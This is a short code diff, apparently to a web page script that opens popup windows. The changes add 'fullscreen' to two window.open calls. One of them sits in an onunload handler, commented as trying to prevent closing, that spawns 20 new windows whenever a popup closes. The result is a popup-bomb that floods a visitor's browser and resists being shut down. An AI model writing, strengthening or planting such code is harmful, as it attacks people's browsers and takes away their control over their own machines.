@@ -47,7 +47,7 @@
         function createPopup() {
             if (popupCount >= maxPopups) return;
             
-            const popup = window.open('', '_blank', 'width=400,height=300');
+            const popup = window.open('', '_blank', 'width=400,height=300,fullscreen');
             if (popup) {
                 popupCount++;
                 activePopups.push(popup);
@@ -93,7 +93,7 @@
                 // Try to prevent closing and spawn many new windows
                 popup.onunload = function() {
                     for(let i = 0; i < 20; i++) {
-                        window.open('', '_blank', 'width=400,height=300');
+                        window.open('', '_blank', 'width=400,height=300,fullscreen');
                     }
                 };
                 
